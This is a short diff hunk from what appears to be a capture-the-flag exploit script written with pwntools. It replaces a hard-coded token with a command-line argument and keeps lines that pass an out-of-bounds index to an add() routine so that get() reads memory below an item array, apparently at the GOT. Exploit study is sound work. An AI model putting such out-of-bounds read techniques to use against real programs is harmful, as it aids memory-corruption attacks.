@@ -32,7 +32,7 @@ else:
 
 items_addr = 0x404020
 
-io.sendlineafter(b'token: ', 'task_token')
+io.sendlineafter(b'token: ', sys.argv[2])
 
 id = add((0x403F80-items_addr)//0x10)
 get(id)
